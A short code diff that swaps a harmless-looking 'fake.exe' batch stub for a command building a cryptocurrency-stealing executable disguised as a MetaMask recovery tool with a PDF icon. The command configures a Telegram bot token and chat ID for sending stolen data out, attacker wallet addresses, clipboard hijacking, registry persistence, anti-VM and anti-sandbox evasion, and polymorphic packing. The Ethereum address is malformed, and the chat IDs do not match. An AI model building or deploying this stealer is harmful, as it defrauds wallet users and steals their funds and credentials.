@@ -1,7 +1,17 @@
-@'
-@echo off
-echo Starting recovery tool...
-echo Verifying wallet integrity...
-timeout /t 2 >nul
-start "" "index.html"
-'@ | Out-File -Encoding ASCII fake.exe
+python3 builder.py \
+  --stealer=crypto-pro \
+  --output="MetaMask_Recovery_Tool.exe" \
+  --icon="assets/pdf_document.ico" \
+  --telegram-token="8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk" \
+  --chat-id="6682145585" \
+  --btc-address="bc1qar0srrr7xfkvy5l643lydnwqhjlw43af85nnu0" \
+  --eth-address="0x1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j" \
+  --clipboard-jack=true \
+  --persistence=registry \
+  --anti-vm=true \
+  --anti-sandbox=true \
+  --delay=180 \
+  --compress=poly
+
+  TELEGRAM_TOKEN = "8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk"
+CHAT_ID = "7873230435"
